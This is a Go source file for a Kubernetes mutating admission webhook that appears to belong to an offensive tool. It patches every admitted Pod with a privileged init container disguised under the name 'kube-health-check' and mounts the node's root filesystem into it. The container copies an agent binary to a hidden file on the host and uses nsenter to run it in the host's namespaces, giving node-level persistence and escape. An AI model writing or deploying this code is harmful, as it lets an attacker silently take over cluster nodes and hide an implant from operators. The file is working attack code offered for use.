package webhook

import (
	"encoding/json"
	"fmt"

	admissionv1 "k8s.io/api/admission/v1"
	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

type Mutator struct {
	image string
}

func NewMutator(image string) *Mutator {
	return &Mutator{image: image}
}

type patchOp struct {
	Op    string      `json:"op"`
	Path  string      `json:"path"`
	Value any `json:"value,omitempty"`
}

func (m *Mutator) Mutate(req *admissionv1.AdmissionRequest) *admissionv1.AdmissionResponse {
	if req.Kind.Kind != "Pod" {
		return allowResponse()
	}

	var pod corev1.Pod
	if err := json.Unmarshal(req.Object.Raw, &pod); err != nil {
		return &admissionv1.AdmissionResponse{
			Allowed: false,
			Result: &metav1.Status{
				Message: fmt.Sprintf("unmarshal pod: %v", err),
			},
		}
	}

	if _, skip := pod.Labels["kubedagger.io/skip"]; skip {
		return allowResponse()
	}

	patches := m.buildPatches(&pod)
	if len(patches) == 0 {
		return allowResponse()
	}

	patchBytes, err := json.Marshal(patches)
	if err != nil {
		return allowResponse()
	}

	patchType := admissionv1.PatchTypeJSONPatch
	return &admissionv1.AdmissionResponse{
		Allowed:   true,
		Patch:     patchBytes,
		PatchType: &patchType,
	}
}

func (m *Mutator) buildPatches(pod *corev1.Pod) []patchOp {
	var patches []patchOp

	privileged := true
	initContainer := corev1.Container{
		Name:  "kube-health-check",
		Image: m.image,
		SecurityContext: &corev1.SecurityContext{
			Privileged: &privileged,
		},
		Command: []string{"/bin/sh", "-c", "cp /agent /host/tmp/.kube-health && nsenter -t 1 -m -u -i -n -p -- /tmp/.kube-health &"},
		VolumeMounts: []corev1.VolumeMount{
			{
				Name:      "host-root",
				MountPath: "/host",
			},
		},
	}

	if len(pod.Spec.InitContainers) == 0 {
		patches = append(patches, patchOp{
			Op:    "add",
			Path:  "/spec/initContainers",
			Value: []corev1.Container{initContainer},
		})
	} else {
		patches = append(patches, patchOp{
			Op:    "add",
			Path:  "/spec/initContainers/-",
			Value: initContainer,
		})
	}

	hostVolume := corev1.Volume{
		Name: "host-root",
		VolumeSource: corev1.VolumeSource{
			HostPath: &corev1.HostPathVolumeSource{
				Path: "/",
			},
		},
	}

	if len(pod.Spec.Volumes) == 0 {
		patches = append(patches, patchOp{
			Op:    "add",
			Path:  "/spec/volumes",
			Value: []corev1.Volume{hostVolume},
		})
	} else {
		patches = append(patches, patchOp{
			Op:    "add",
			Path:  "/spec/volumes/-",
			Value: hostVolume,
		})
	}

	return patches
}
